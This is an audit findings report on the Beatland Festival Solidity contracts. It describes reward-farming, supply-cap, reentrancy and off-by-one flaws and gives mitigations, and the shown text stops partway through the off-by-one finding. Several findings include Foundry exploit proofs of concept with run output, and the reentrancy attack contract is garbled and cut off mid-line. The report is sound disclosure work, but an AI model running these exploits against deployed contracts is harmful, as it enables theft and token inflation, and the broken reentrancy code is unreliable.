# Beatland Festival - Findings Report

# Table of contents
- ### [Contest Summary](#contest-summary)
- ### [Results Summary](#results-summary)
- ## High Risk Findings
    - [H-01. Pass Lending Reward Multiplication Enables Unlimited Performance Rewards](#H-01)
- ## Medium Risk Findings
    - [M-01. [H-1] Reseting the current pass supply to 0 in the FestivalPass::configurePass function allows users to bypass the max supply cap of a pass ](#M-01)
    - [M-02. Function `FestivalPass:buyPass` Lacks Defense Against Reentrancy Attacks, Leading to Exceeding the Maximum NFT Pass Supply](#M-02)
    - [M-03. Off-by-One in `redeemMemorabilia` Prevents Last NFT From Being Redeemed](#M-03)
    - [M-04. A malicious contract can monopolize all memorabilia in a single transaction via ERC1155 reentrancy](#M-04)
- ## Low Risk Findings
    - [L-01. Inactive Collections — Indefinite BEAT Lock-up](#L-01)
    - [L-02. FestivalPass.sol - URI Function Returns Metadata for Non-Existent Items](#L-02)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #44

### Dates: Jul 17th, 2025 - Jul 24th, 2025

[See more contest details here](https://codehawks.cyfrin.io/c/2025-07-beatland-festival)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 1
   - Medium: 4
   - Low: 2


# High Risk Findings

## <a id='H-01'></a>H-01. Pass Lending Reward Multiplication Enables Unlimited Performance Rewards

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


# Root + Impact

## Description

* The `attendPerformance()` function is designed to reward pass holders for attending performances, with VIP and BACKSTAGE passes receiving multiplied rewards based on their tier. Under normal operation, each pass should generate rewards for a single attendee per performance, maintaining balanced tokenomics where one pass purchase corresponds to one set of performance rewards throughout the festival.

* However, the attendance system tracks attendance per user rather than per pass, while pass ownership validation occurs only at the moment of attendance through `hasPass()`. This allows coordinated users to share a single pass by strategically transferring it between attendees, enabling multiple users to attend the same performance with the same pass and each receive full multiplied rewards, effectively turning one pass purchase into unlimited reward generation.

```Solidity
function attendPerformance(uint256 performanceId) external {
    require(isPerformanceActive(performanceId), "Performance is not active");
@>  require(hasPass(msg.sender), "Must own a pass"); // Only checks current ownership
@>  require(!hasAttended[performanceId][msg.sender], "Already attended this performance"); // Per-user tracking
    require(block.timestamp >= lastCheckIn[msg.sender] + COOLDOWN, "Cooldown period not met");
    
@>  hasAttended[performanceId][msg.sender] = true; // Marks user as attended
    lastCheckIn[msg.sender] = block.timestamp;
    
    uint256 multiplier = getMultiplier(msg.sender);
    BeatToken(beatToken).mint(msg.sender, performances[performanceId].baseReward * multiplier);
}

function hasPass(address user) public view returns (bool) {
@>  return balanceOf(user, GENERAL_PASS) > 0 || 
           balanceOf(user, VIP_PASS) > 0 || 
           balanceOf(user, BACKSTAGE_PASS) > 0; // Only checks current balance
}
```

The vulnerability exists in the combination of per-user attendance tracking (`hasAttended[performanceId][msg.sender]`) and point-in-time pass ownership validation (`hasPass(msg.sender)`). The system records that a specific user attended a specific performance, but does not track which pass was used or prevent the same pass from being used by multiple users for the same performance through transfers.

## Risk

**Likelihood**:

*  The vulnerability requires coordination between multiple users and strategic timing of pass transfers during active performance windows, which demands planning and cooperation rather than simple individual exploitation.   
* The attack becomes immediately executable once multiple users coordinate, as ERC1155 transfers are permissionless and the attendance system provides no restrictions on pass transfers between attendance events.

**Impact**:

* Unlimited reward farming from single pass purchases enables coordinated groups to multiply performance rewards indefinitely (demonstrated: 4x-10x reward multiplication), completely breaking the intended pass-to-reward ratio and causing massive BEAT token inflation.

* Complete bypass of cooldown mechanisms and attendance restrictions through pass lending, allowing rapid reward extraction and undermining all intended rate-limiting protections designed to prevent reward farming abuse.

## Proof of Concept

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import "forge-std/Test.sol";
import "../src/FestivalPass.sol";
import "../src/BeatToken.sol";
import {console} from "forge-std/console.sol";

/**
 * @title Pass Lending Reward Multiplication PoC
 * @dev Demonstrates how single pass can generate unlimited rewards across multiple users
 *      through strategic pass transfers and coordinated attendance
 * 
 * VULNERABILITY: No ownership tracking during attendance
 *   - hasPass() only checks current balance at time of attendance
 *   - attendPerformance() tracks attendance per user, not per pass
 *   - Single pass can be transferred between users for unlimited reward farming
 * 
 * ATTACK VECTOR:
 *   1. Alice buys 1 VIP pass and attends performance → earns 2x rewards
 *   2. Alice transfers pass to Bob 
 *   3. Bob attends same performance → earns 2x rewards  
 *   4. Bob transfers pass to Charlie → Charlie attends → repeat
 *   5. Single pass generates unlimited rewards across unlimited users
 */
contract PassLendingExploitPoC is Test {
    FestivalPass public festivalPass;
    BeatToken public beatToken;
    
    address public owner;
    address public organizer;
    address public alice;
    address public bob;
    address public charlie;
    address public dave;
    
    // Pass configuration for maximum reward exploitation
    uint256 constant VIP_PRICE = 0.1 ether;
    uint256 constant VIP_MAX_SUPPLY = 1000;
    uint256 constant VIP_PASS = 2;
    uint256 constant VIP_MULTIPLIER = 2; // 2x rewards
    
    uint256 public performanceId;
    uint256 constant BASE_REWARD = 100e18;
    uint256 constant EXPECTED_VIP_REWARD = BASE_REWARD * VIP_MULTIPLIER; // 200 BEAT
    
    function setUp() public {
        owner = makeAddr("owner");
        organizer = makeAddr("organizer");
        alice = makeAddr("alice");
        bob = makeAddr("bob");
        charlie = makeAddr("charlie");
        dave = makeAddr("dave");
        
        // Deploy protocol
        vm.startPrank(owner);
        beatToken = new BeatToken();
        festivalPass = new FestivalPass(address(beatToken), organizer);
        beatToken.setFestivalContract(address(festivalPass));
        vm.stopPrank();
        
        // Configure VIP pass
        vm.prank(organizer);
        festivalPass.configurePass(VIP_PASS, VIP_PRICE, VIP_MAX_SUPPLY);
        
        // Create a performance for exploitation
        vm.prank(organizer);
        performanceId = festivalPass.createPerformance(
            block.timestamp + 1 hours,  // starts in 1 hour
            4 hours,                     // lasts 4 hours  
            BASE_REWARD                  // base reward
        );
        
        // Fund Alice to buy the pass
        vm.deal(alice, 1 ether);
    }
    
    function testSinglePassMultipleRewards() public {
        console.log("=== PASS LENDING REWARD MULTIPLICATION EXPLOIT ===\n");
        
        // Alice buys single VIP pass
        console.log("--- Setup: Alice buys 1 VIP pass ---");
        vm.prank(alice);
        festivalPass.buyPass{value: VIP_PRICE}(VIP_PASS);
        
        console.log("Alice VIP balance:", festivalPass.balanceOf(alice, VIP_PASS));
        console.log("Alice BEAT balance (welcome bonus):", beatToken.balanceOf(alice));
        
        // Warp to performance time
        vm.warp(block.timestamp + 2 hours);
        console.log("\n--- Performance starts, exploitation begins ---");
        
        // STEP 1: Alice attends performance and earns rewards
        console.log("STEP 1: Alice attends performance");
        vm.prank(alice);
        festivalPass.attendPerformance(performanceId);
        
        uint256 aliceReward = beatToken.balanceOf(alice) - 5e18; // subtract welcome bonus
        console.log("Alice attendance reward:", aliceReward);
        console.log("Alice has attended:", festivalPass.hasAttended(performanceId, alice));
        
        // STEP 2: Alice transfers pass to Bob
        console.log("\nSTEP 2: Alice transfers VIP pass to Bob");
        vm.prank(alice);
        festivalPass.safeTransferFrom(alice, bob, VIP_PASS, 1, "");
        
        console.log("Alice VIP balance:", festivalPass.balanceOf(alice, VIP_PASS));
        console.log("Bob VIP balance:", festivalPass.balanceOf(bob, VIP_PASS));
        console.log("Bob has pass:", festivalPass.hasPass(bob));
        
        // STEP 3: Bob attends SAME performance with transferred pass
        console.log("\nSTEP 3: Bob attends SAME performance with transferred pass");
        vm.prank(bob);
        festivalPass.attendPerformance(performanceId);
        
        uint256 bobReward = beatToken.balanceOf(bob);
        console.log("Bob attendance reward:", bobReward);
        console.log("Bob has attended:", festivalPass.hasAttended(performanceId, bob));
        
        // STEP 4: Bob transfers pass to Charlie  
        console.log("\nSTEP 4: Bob transfers VIP pass to Charlie");
        vm.prank(bob);
        festivalPass.safeTransferFrom(bob, charlie, VIP_PASS, 1, "");
        
        // STEP 5: Charlie attends SAME performance
        console.log("\nSTEP 5: Charlie attends SAME performance");
        vm.prank(charlie);
        festivalPass.attendPerformance(performanceId);
        
        uint256 charlieReward = beatToken.balanceOf(charlie);
        console.log("Charlie attendance reward:", charlieReward);
        
        // STEP 6: Charlie transfers to Dave for final demonstration
        console.log("\nSTEP 6: Charlie transfers to Dave");
        vm.prank(charlie);
        festivalPass.safeTransferFrom(charlie, dave, VIP_PASS, 1, "");
        
        vm.prank(dave);
        festivalPass.attendPerformance(performanceId);
        
        uint256 daveReward = beatToken.balanceOf(dave);
        console.log("Dave attendance reward:", daveReward);
        
        // Calculate total exploitation
        console.log("\n=== EXPLOITATION RESULTS ===");
        uint256 totalRewards = aliceReward + bobReward + charlieReward + daveReward;
        uint256 legitimateReward = EXPECTED_VIP_REWARD; // Only 1 person should get rewards
        
        console.log("Total BEAT farmed from 1 pass:", totalRewards);
        console.log("Legitimate reward (1 person):", legitimateReward);
        console.log("Reward multiplication factor:", totalRewards / legitimateReward);
        console.log("Excess BEAT stolen:", totalRewards - legitimateReward);
        
        // Verify the exploit
        assertEq(aliceReward, EXPECTED_VIP_REWARD, "Alice should get VIP reward");
        assertEq(bobReward, EXPECTED_VIP_REWARD, "Bob should get VIP reward"); 
        assertEq(charlieReward, EXPECTED_VIP_REWARD, "Charlie should get VIP reward");
        assertEq(daveReward, EXPECTED_VIP_REWARD, "Dave should get VIP reward");
        assertEq(totalRewards, 4 * legitimateReward, "4x reward multiplication");
        
        // Show that attendance tracking is per-user, not per-pass
        console.log("\nAttendance tracking per user:");
        console.log("Alice attended:", festivalPass.hasAttended(performanceId, alice));
        console.log("Bob attended:", festivalPass.hasAttended(performanceId, bob));
        console.log("Charlie attended:", festivalPass.hasAttended(performanceId, charlie));
        console.log("Dave attended:", festivalPass.hasAttended(performanceId, dave));
        
        // Current pass holder
        console.log("Final pass holder (Dave):", festivalPass.balanceOf(dave, VIP_PASS));
    }
    
    function testLargeScalePassLendingRing() public {
        console.log("=== LARGE-SCALE PASS LENDING RING ===\n");
        
        // Alice buys single BACKSTAGE pass (highest multiplier)
        uint256 BACKSTAGE_PRICE = 0.25 ether;
        uint256 BACKSTAGE_PASS = 3;
        uint256 BACKSTAGE_MULTIPLIER = 3;
        
        vm.prank(organizer);
        festivalPass.configurePass(BACKSTAGE_PASS, BACKSTAGE_PRICE, 100);
        
        vm.deal(alice, 1 ether);
        vm.prank(alice);
        festivalPass.buyPass{value: BACKSTAGE_PRICE}(BACKSTAGE_PASS);
        
        // Create multiple performances for maximum exploitation
        vm.startPrank(organizer);
        uint256 perf1 = festivalPass.createPerformance(block.timestamp + 1 hours, 6 hours, BASE_REWARD);
        uint256 perf2 = festivalPass.createPerformance(block.timestamp + 2 hours, 6 hours, BASE_REWARD);
        vm.stopPrank();
        
        // Create lending ring of 10 users
        address[] memory lendingRing = new address[](10);
        for (uint256 i = 0; i < 10; i++) {
            lendingRing[i] = makeAddr(string(abi.encodePacked("user", i)));
        }
        lendingRing[0] = alice; // Alice starts with the pass
        
        console.log("Lending ring size:", lendingRing.length);
        console.log("BACKSTAGE pass multiplier:", BACKSTAGE_MULTIPLIER);
        console.log("Expected reward per attendance:", BASE_REWARD * BACKSTAGE_MULTIPLIER);
        
        // Exploit Performance 1
        vm.warp(block.timestamp + 90 minutes);
        console.log("\n--- Exploiting Performance 1 ---");
        
        for (uint256 i = 0; i < lendingRing.length; i++) {
            address currentUser = lendingRing[i];
            
            // User attends performance
            vm.prank(currentUser);
            festivalPass.attendPerformance(perf1);
            
            uint256 reward = beatToken.balanceOf(currentUser);
            if (i == 0) reward -= 15e18; // subtract Alice's welcome bonus
            
            console.log("User", i, "reward:", reward);
            
            // Transfer to next user (except last)
            if (i < lendingRing.length - 1) {
                address nextUser = lendingRing[i + 1];
                vm.prank(currentUser);
                festivalPass.safeTransferFrom(currentUser, nextUser, BACKSTAGE_PASS, 1, "");
            }
        }
        
        // Wait for cooldown and exploit Performance 2
        vm.warp(block.timestamp + 2 hours);
        console.log("\n--- Exploiting Performance 2 ---");
        
        // Start from last user who has the pass
        address currentHolder = lendingRing[lendingRing.length - 1];
        
        for (uint256 i = 0; i < lendingRing.length; i++) {
            vm.prank(currentHolder);
            festivalPass.attendPerformance(perf2);
            
            // Transfer to next user for continued exploitation  
            if (i < lendingRing.length - 1) {
                address nextUser = lendingRing[i];
                vm.prank(currentHolder);
                festivalPass.safeTransferFrom(currentHolder, nextUser, BACKSTAGE_PASS, 1, "");
                currentHolder = nextUser;
            }
        }
        
        // Calculate total damage
        console.log("\n=== LARGE-SCALE EXPLOITATION RESULTS ===");
        uint256 totalBEATFarmed = 0;
        
        for (uint256 i = 0; i < lendingRing.length; i++) {
            uint256 userBalance = beatToken.balanceOf(lendingRing[i]);
            if (i == 0) userBalance -= 15e18; // subtract welcome bonus
            totalBEATFarmed += userBalance;
            console.log("User", i, "total BEAT:", userBalance);
        }
        
        uint256 legitimateTotal = 2 * BASE_REWARD * BACKSTAGE_MULTIPLIER; // 2 performances, 1 person
        console.log("Total BEAT farmed:", totalBEATFarmed);
        console.log("Legitimate total (2 performances, 1 person):", legitimateTotal);
        console.log("Exploitation multiplier:", totalBEATFarmed / legitimateTotal);
        
        assertGe(totalBEATFarmed, legitimateTotal * 10, "Should farm >=10x legitimate rewards");
    }
    
    function testCooldownBypassThroughLending() public {
        console.log("=== COOLDOWN BYPASS THROUGH PASS LENDING ===\n");
        
        // Alice buys VIP pass
        vm.prank(alice);
        festivalPass.buyPass{value: VIP_PRICE}(VIP_PASS);
        
        // Create overlapping performances to test cooldown bypass
        vm.startPrank(organizer);
        uint256 perf1 = festivalPass.createPerformance(block.timestamp + 1 hours, 3 hours, BASE_REWARD);
        uint256 perf2 = festivalPass.createPerformance(block.timestamp + 1 hours, 3 hours, BASE_REWARD);
        vm.stopPrank();
        
        vm.warp(block.timestamp + 90 minutes);
        
        // Alice attends performance 1
        console.log("Alice attends performance 1");
        vm.prank(alice);
        festivalPass.attendPerformance(perf1);
        console.log("Alice lastCheckIn:", festivalPass.lastCheckIn(alice));
        
        // Alice tries to attend performance 2 immediately (should fail due to cooldown)
        console.log("\nAlice tries performance 2 immediately:");
        vm.prank(alice);
        vm.expectRevert("Cooldown period not met");
        festivalPass.attendPerformance(perf2);
        console.log(" Cooldown protection working");
        
        // Alice transfers pass to Bob to bypass cooldown
        console.log("\nAlice transfers pass to Bob to bypass cooldown");
        vm.prank(alice);
        festivalPass.safeTransferFrom(alice, bob, VIP_PASS, 1, "");
        
        // Bob can immediately attend performance 2 (no cooldown for Bob)
        console.log("Bob attends performance 2 immediately:");
        vm.prank(bob);
        festivalPass.attendPerformance(perf2);
        
        uint256 bobReward = beatToken.balanceOf(bob);
        console.log("Bob reward:", bobReward);
        console.log("Bob lastCheckIn:", festivalPass.lastCheckIn(bob));
        
        console.log("\n=== COOLDOWN BYPASS RESULTS ===");
        console.log("Alice could not attend due to cooldown");
        console.log("Bob successfully attended immediately after transfer");
        console.log("Cooldown mechanism bypassed through pass lending");
        
        assertEq(bobReward, EXPECTED_VIP_REWARD, "Bob should successfully earn rewards");
        assertEq(festivalPass.lastCheckIn(bob), block.timestamp, "Bob's check-in should be recorded");
    }
}
```

```Solidity
forge test --match-contract PassLendingExploitPoC -vv
[⠰] Compiling...
[⠃] Compiling 1 files with Solc 0.8.25
[⠊] Solc 0.8.25 finished in 442.56ms
Compiler run successful!

Ran 3 tests for test/PassLendingExploit.t.sol:PassLendingExploitPoC
[PASS] testCooldownBypassThroughLending() (gas: 473221)
Logs:
  === COOLDOWN BYPASS THROUGH PASS LENDING ===

  Alice attends performance 1
  Alice lastCheckIn: 5401

Alice tries performance 2 immediately:
   Cooldown protection working

Alice transfers pass to Bob to bypass cooldown
  Bob attends performance 2 immediately:
  Bob reward: 200000000000000000000
  Bob lastCheckIn: 5401

=== COOLDOWN BYPASS RESULTS ===
  Alice could not attend due to cooldown
  Bob successfully attended immediately after transfer
  Cooldown mechanism bypassed through pass lending

[PASS] testLargeScalePassLendingRing() (gas: 1794585)
Logs:
  === LARGE-SCALE PASS LENDING RING ===

  Lending ring size: 10
  BACKSTAGE pass multiplier: 3
  Expected reward per attendance: 300000000000000000000

--- Exploiting Performance 1 ---
  User 0 reward: 300000000000000000000
  User 1 reward: 300000000000000000000
  User 2 reward: 300000000000000000000
  User 3 reward: 300000000000000000000
  User 4 reward: 300000000000000000000
  User 5 reward: 300000000000000000000
  User 6 reward: 300000000000000000000
  User 7 reward: 300000000000000000000
  User 8 reward: 300000000000000000000
  User 9 reward: 300000000000000000000

--- Exploiting Performance 2 ---

=== LARGE-SCALE EXPLOITATION RESULTS ===
  User 0 total BEAT: 600000000000000000000
  User 1 total BEAT: 600000000000000000000
  User 2 total BEAT: 600000000000000000000
  User 3 total BEAT: 600000000000000000000
  User 4 total BEAT: 600000000000000000000
  User 5 total BEAT: 600000000000000000000
  User 6 total BEAT: 600000000000000000000
  User 7 total BEAT: 600000000000000000000
  User 8 total BEAT: 600000000000000000000
  User 9 total BEAT: 600000000000000000000
  Total BEAT farmed: 6000000000000000000000
  Legitimate total (2 performances, 1 person): 600000000000000000000
  Exploitation multiplier: 10

[PASS] testSinglePassMultipleRewards() (gas: 567999)
Logs:
  === PASS LENDING REWARD MULTIPLICATION EXPLOIT ===

  --- Setup: Alice buys 1 VIP pass ---
  Alice VIP balance: 1
  Alice BEAT balance (welcome bonus): 5000000000000000000

--- Performance starts, exploitation begins ---
  STEP 1: Alice attends performance
  Alice attendance reward: 200000000000000000000
  Alice has attended: true

STEP 2: Alice transfers VIP pass to Bob
  Alice VIP balance: 0
  Bob VIP balance: 1
  Bob has pass: true

STEP 3: Bob attends SAME performance with transferred pass
  Bob attendance reward: 200000000000000000000
  Bob has attended: true

STEP 4: Bob transfers VIP pass to Charlie

STEP 5: Charlie attends SAME performance
  Charlie attendance reward: 200000000000000000000

STEP 6: Charlie transfers to Dave
  Dave attendance reward: 200000000000000000000

=== EXPLOITATION RESULTS ===
  Total BEAT farmed from 1 pass: 800000000000000000000
  Legitimate reward (1 person): 200000000000000000000
  Reward multiplication factor: 4
  Excess BEAT stolen: 600000000000000000000

Attendance tracking per user:
  Alice attended: true
  Bob attended: true
  Charlie attended: true
  Dave attended: true
  Final pass holder (Dave): 1

Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 2.49ms (2.14ms CPU time)

Ran 1 test suite in 4.56ms (2.49ms CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)

```

## Recommended Mitigation

The fix implements per-pass attendance tracking to ensure each individual pass can only be used once per performance, regardless of how many times it's transferred between users. This preserves the intended 1-pass-1-reward economics while still allowing legitimate pass transfers for other purposes, preventing coordinated reward multiplication while maintaining the flexibility of the ERC1155 standard.

```diff
contract FestivalPass is ERC1155, Ownable2Step, IFestivalPass {
    // ... existing state variables ...
+   mapping(uint256 => mapping(uint256 => bool)) public passUsedForPerformance; // performanceId => passTokenId => used
    
    function attendPerformance(uint256 performanceId) external {
        require(isPerformanceActive(performanceId), "Performance is not active");
        require(hasPass(msg.sender), "Must own a pass");
        require(!hasAttended[performanceId][msg.sender], "Already attended this performance");
        require(block.timestamp >= lastCheckIn[msg.sender] + COOLDOWN, "Cooldown period not met");
        
+       // Check which pass type the user owns and mark it as used
+       uint256 userPassId = getUserPassId(msg.sender);
+       require(!passUsedForPerformance[performanceId][userPassId], "This pass already used for this performance");
+       passUsedForPerformance[performanceId][userPassId] = true;
        
        hasAttended[performanceId][msg.sender] = true;
        lastCheckIn[msg.sender] = block.timestamp;
        
        uint256 multiplier = getMultiplier(msg.sender);
        BeatToken(beatToken).mint(msg.sender, performances[performanceId].baseReward * multiplier);
        emit Attended(msg.sender, performanceId, performances[performanceId].baseReward * multiplier);
    }
    
+   function getUserPassId(address user) internal view returns (uint256) {
+       if (balanceOf(user, BACKSTAGE_PASS) > 0) return BACKSTAGE_PASS;
+       if (balanceOf(user, VIP_PASS) > 0) return VIP_PASS;
+       if (balanceOf(user, GENERAL_PASS) > 0) return GENERAL_PASS;
+       revert("User has no pass");
+   }
}
```


# Medium Risk Findings

## <a id='M-01'></a>M-01. [H-1] Reseting the current pass supply to 0 in the FestivalPass::configurePass function allows users to bypass the max supply cap of a pass 

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


# \[H-1] Reseting the current pass supply to `0` in the `FestivalPass::configurePass` function allows users to bypass the max supply cap of a pass

## Description:

```solidity
function configurePass(uint256 passId, uint256 price, uint256 maxSupply) external onlyOrganizer {
        require(passId == GENERAL_PASS || passId == VIP_PASS || passId == BACKSTAGE_PASS, "Invalid pass ID");
        require(price > 0, "Price must be greater than 0");
        require(maxSupply > 0, "Max supply must be greater than 0");

        passPrice[passId] = price;
        passMaxSupply[passId] = maxSupply;
        
@>        passSupply[passId] = 0; // Reset current supply
    }
```

If you reset `passSupply[passId]` to `0` in the `FestivalPass::configurePass` function after passes have been sold, the next buyer will be able to mint as if no passes have been sold.

This allows the total minted passes to exceed `passMaxSupply`, which is a serious vulnerability (a supply cap bypass)

## Impact:

* Supply caps become meaningless: The users can mint unlimited passes beyond the intended maximum supply

* Pass scarcity and value are destroyed, affecting the economic model

## Proof of Concept:

```solidity
 function test_SupplyCapBypassVulnerability() public {
        // Step 1: Configure a pass with max supply of 2
        vm.prank(organizer);
        festivalPass.configurePass(1, GENERAL_PRICE, 2);

        // Step 2: Buy 2 passes (reaching max supply)
        vm.prank(user1);
        festivalPass.buyPass{value: GENERAL_PRICE}(1);

        vm.prank(user2);
        festivalPass.buyPass{value: GENERAL_PRICE}(1);

        // Verify max supply reached
        assertEq(festivalPass.passSupply(1), 2);
        assertEq(festivalPass.passMaxSupply(1), 2);

        // Step 3: Try to buy another pass - should fail
        address user3 = makeAddr("user3");
        vm.deal(user3, 10 ether);
        vm.prank(user3);
        vm.expectRevert("Max supply reached");
        festivalPass.buyPass{value: GENERAL_PRICE}(1);

        // Step 4: VULNERABILITY - Organizer reconfigures the pass
        // This resets passSupply[1] to 0, bypassing the supply cap!
        vm.prank(organizer);
        festivalPass.configurePass(1, GENERAL_PRICE, 2);

        // Step 5: Now we can buy more passes even though max supply was already reached
        vm.prank(user3);
        festivalPass.buyPass{value: GENERAL_PRICE}(1);

        // Step 6: We can even buy more passes beyond the original max supply
        vm.deal(user4, 10 ether);
        vm.prank(user4);
        festivalPass.buyPass{value: GENERAL_PRICE}(1);

        // Step 7: Verify the vulnerability - total supply exceeds max supply
        assertEq(festivalPass.passSupply(1), 2); // Current supply counter
        assertEq(festivalPass.passMaxSupply(1), 2); // Max supply limit

        // But we actually have 4 passes minted in total!
        assertEq(festivalPass.balanceOf(user1, 1), 1);
        assertEq(festivalPass.balanceOf(user2, 1), 1);
        assertEq(festivalPass.balanceOf(user3, 1), 1);
        assertEq(festivalPass.balanceOf(user4, 1), 1);

        // Total minted: 4 passes, but max supply is only 2!
        uint256 totalMinted = festivalPass.balanceOf(user1, 1) + festivalPass.balanceOf(user2, 1)
            + festivalPass.balanceOf(user3, 1) + festivalPass.balanceOf(user4, 1);

        assertGt(totalMinted, festivalPass.passMaxSupply(1), "VULNERABILITY: Total minted exceeds max supply!");
    }
```

## Recommended Mitigation:

The `passSupply` reset should be removed

```diff
function configurePass(uint256 passId, uint256 price, uint256 maxSupply) external onlyOrganizer {
    require(passId == GENERAL_PASS || passId == VIP_PASS || passId == BACKSTAGE_PASS, "Invalid pass ID");
    require(price > 0, "Price must be greater than 0");
    require(maxSupply > 0, "Max supply must be greater than 0");

    passPrice[passId] = price;
    passMaxSupply[passId] = maxSupply;

-     passSupply[passId] = 0; 
}
```

## <a id='M-02'></a>M-02. Function `FestivalPass:buyPass` Lacks Defense Against Reentrancy Attacks, Leading to Exceeding the Maximum NFT Pass Supply

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


# Function `FestivalPass:buyPass` Lacks Defense Against Reentrancy Attacks, Leading to Exceeding the Maximum NFT Pass Supply

## Description

* Under normal circumstances, the system should control the supply of tokens or resources to ensure that it does not exceed a predefined maximum limit. This helps maintain system stability, security, and predictable behavior.

* The function `FestivalPass:buyPass` does not follow the **Checks-Effects-Interactions** pattern. If a user uses a malicious contract as their account and includes reentrancy logic, they can bypass the maximum supply limit.

```solidity
	function buyPass(uint256 collectionId) external payable {
		// Must be valid pass ID (1 or 2 or 3)
		require(collectionId == GENERAL_PASS || collectionId == VIP_PASS || collectionId == BACKSTAGE_PASS, "Invalid pass ID");
		// Check payment and supply
		require(msg.value == passPrice[collectionId], "Incorrect payment amount");
		require(passSupply[collectionId] < passMaxSupply[collectionId], "Max supply reached");
		// Mint 1 pass to buyer
@>		_mint(msg.sender, collectionId, 1, ""); // question: potential reentrancy?
		++passSupply[collectionId];
		// VIP gets 5 BEAT welcome bonus, BACKSTAGE gets 15 BEAT welcome bonus
		uint256 bonus = (collectionId == VIP_PASS) ? 5e18 : (collectionId == BACKSTAGE_PASS) ? 15e18 : 0;
		if (bonus > 0) {
			// Mint BEAT tokens to buyer
			BeatToken(beatToken).mint(msg.sender, bonus);
		}
		emit PassPurchased(msg.sender, collectionId);
	}
```

## Risk

**Likelihood**:

* If a user uses a contract wallet with reentrancy logic, they can trigger multiple malicious calls during the execution of the `_mint` function.

**Impact**:

* Although the attacker still pays for each purchase, the total number of minted NFTs will exceed the intended maximum supply. This can lead to supply inflation and user dissatisfaction.

## Proof of Concept

````Solidity
//SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";
import "../src/FestivalPass.sol";
import "./FestivalPass.t.sol";
import {console} from "forge-std/Test.sol";

contract AttackBuyPass{
	address immutable onlyOnwer;
	FestivalPassTest immutable festivalPassTest;
	FestivalPass immutable festivalPass;
	uint256 immutable collectionId;
	uint256 immutable configPassPrice;
	uint256 immutable configPassMaxSupply;
	
	uint256 hackMintCount = 0;
	
	constructor(FestivalPassTest _festivalPassTest, FestivalPass _festivalPass, uint256 _collectionId, uint256 _configPassPrice, uint256 _configPassMaxSupply) payable {
		onlyOnwer = msg.sender;
		
		festivalPassTest = _festivalPassTest;
		festivalPass = _festivalPass;
		collectionId = _collectionId;
		configPassPrice = _configPassPrice;
		configPassMaxSupply = _configPassMaxSupply;
	
		hackMintCount = 1;
	}
	
	receive() external payable {}
	fallback() external payable {}
	
	function DoAttackBuyPass() public {
		require(msg.sender == onlyOnwer, "AttackBuyPass: msg.sender != onlyOnwer");
	
		// This attack can only bypass the "maximum supply" restriction.
		festivalPass.buyPass{value: configPassPrice}(collectionId);
	}
	
	function onERC1155Received(
		address operator,
		address from,
		uint256 id,
		uint256 value,
		bytes calldata data
	) external returns (bytes4){
		if (hackMintCount  festivalPass.passMaxSupply(targetPassId));
	}
}
```
````

## Recommended Mitigation

* Refactor the function `FestivalPass:buyPass` to follow the **Checks-Effects-Interactions** principle.

```diff
    function buyPass(uint256 collectionId) external payable {
        // Must be valid pass ID (1 or 2 or 3)
        require(collectionId == GENERAL_PASS || collectionId == VIP_PASS || collectionId == BACKSTAGE_PASS, "Invalid pass ID");
        // Check payment and supply
        require(msg.value == passPrice[collectionId], "Incorrect payment amount");
        require(passSupply[collectionId] < passMaxSupply[collectionId], "Max supply reached");
        // Mint 1 pass to buyer
-        _mint(msg.sender, collectionId, 1, ""); 
        ++passSupply[collectionId];
+        emit PassPurchased(msg.sender, collectionId);        
+        _mint(msg.sender, collectionId, 1, "");        
        // VIP gets 5 BEAT welcome bonus, BACKSTAGE gets 15 BEAT welcome bonus
        uint256 bonus = (collectionId == VIP_PASS) ? 5e18 : (collectionId == BACKSTAGE_PASS) ? 15e18 : 0;
        if (bonus > 0) {
            // Mint BEAT tokens to buyer
            BeatToken(beatToken).mint(msg.sender, bonus);
        }
-        emit PassPurchased(msg.sender, collectionId);
    }
```

## <a id='M-03'></a>M-03. Off-by-One in `redeemMemorabilia` Prevents Last NFT From Being Redeemed

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


# Off-by-One in `redeemMemorabilia` Prevents Last NFT From Being Redeemed

## Description

* The `createMemorabiliaCollection` function allows an organizer to create an NFT collection that can be exchanged for the BEAT token via the `redeemMemorabilia` function by users.

* The `redeemMemorabilia` function checks if `collection.currentItemId` is less than `collection.maxSupply`. However, the `currentItemId` starts with 1 in the `createMemorabiliaCollection` function. This prevents the final item (where `currentItemId` equals `maxSupply`) from being redeemed.

```Solidity
    function createMemorabiliaCollection(
        string memory name,
        string memory baseUri,
        uint256 priceInBeat,
        uint256 maxSupply,
        bool activateNow
    ) external onlyOrganizer returns (uint256) {
        require(priceInBeat > 0, "Price must be greater than 0");
        require(maxSupply > 0, "Supply must be at least 1");
        require(bytes(name).length > 0, "Name required");
        require(bytes(baseUri).length > 0, "URI required");
        
        uint256 collectionId = nextCollectionId++;
        
        collections[collectionId] = MemorabiliaCollection({
            name: name,
            baseUri: baseUri,
            priceInBeat: priceInBeat,
            maxSupply: maxSupply,
@>          currentItemId: 1, // Start item IDs at 1
            isActive: activateNow
        });
        
        emit CollectionCreated(collectionId, name, maxSupply);
        return collectionId;
    }

    function redeemMemorabilia(uint256 collectionId) external {
        MemorabiliaCollection storage collection = collections[collectionId];
        require(collection.priceInBeat > 0, "Collection does not exist");
        require(collection.isActive, "Collection not active");
@>      require(collection.currentItemId < collection.maxSupply, "Collection sold out");
        
        // Burn BEAT tokens
        BeatToken(beatToken).burnFrom(msg.sender, collection.priceInBeat);
        
        // Generate unique token ID
        uint256 itemId = collection.currentItemId++;
        uint256 tokenId = encodeTokenId(collectionId, itemId);
        
        // Store edition number
        tokenIdToEdition[tokenId] = itemId;
        
